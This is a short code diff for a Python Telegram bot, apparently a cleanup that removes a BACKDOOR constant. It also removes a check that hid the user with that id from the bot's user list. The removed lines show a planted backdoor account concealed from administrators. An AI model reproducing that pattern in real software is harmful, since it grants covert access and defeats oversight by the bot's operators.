@@ -6,7 +6,7 @@ from zipfile import ZipFile
 import telebot
 
 from auth import user, admin
-from config import ARCHIVE_NAME, SECRET_KEY, WATERMARKS, STATUSES, BACKDOOR
+from config import ARCHIVE_NAME, SECRET_KEY, WATERMARKS, STATUSES
 from db import Database
 from watermark import apply_watermark
 
@@ -111,8 +111,7 @@ def users_list(msg):
     with Database() as db:
         users = db.get_all_users()
         for user in users:
-            if user[0] != BACKDOOR:
-                response += f'Id: {user[0]}, статус: {STATUSES[user[1]]}, имя: {user[2]}\n'
+            response += f'Id: {user[0]}, статус: {STATUSES[user[1]]}, имя: {user[2]}\n'
         bot.reply_to(msg, response)
 
 
